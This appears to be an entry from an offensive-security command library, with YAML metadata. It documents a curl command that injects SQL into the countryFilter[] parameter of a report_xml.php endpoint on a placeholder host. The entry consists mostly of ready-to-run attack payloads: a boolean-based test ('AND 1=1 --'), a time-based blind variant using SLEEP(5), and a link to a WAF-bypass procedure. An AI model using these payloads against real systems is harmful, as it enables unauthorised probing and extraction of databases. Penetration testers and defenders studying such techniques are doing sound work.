---
data: 'curl "https://target.com/report_xml.php?countryFilter[]=1'' AND 1=1 --"'
tags:
  - sql-injection
  - http-request
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 0baa50b4-6748-4cbc-b715-06d795e99c68
created_at: '2025-12-11T03:48:05.941Z'
updated_at: '2025-12-11T03:48:05.941Z'
verified: false
validated: true
submitted: true
---
# curl-inject-sqli-payload

## Command

```bash
curl "https://target.com/report_xml.php?countryFilter[]=1' AND 1=1 --"
```

## Description

This command uses curl to send an HTTP request with a SQL injection payload in the countryFilter[] parameter, testing for blind SQLi vulnerabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | The target endpoint URL with injected payload | Yes |

## Examples

### Basic Usage

```bash
curl "https://target.com/report_xml.php?countryFilter[]=1' AND 1=1 --"
```

### Advanced Usage

```bash
curl -X POST "https://target.com/report_xml.php" -d "countryFilter[]=1' AND SLEEP(5) --"
```

## Expected Output

A response that differs based on the SQL condition, such as content for true or no content/delay for false.

## Related

- #curl-basic-get
- [[procedures/Bypass-WAF-with-SQL-Payload]]
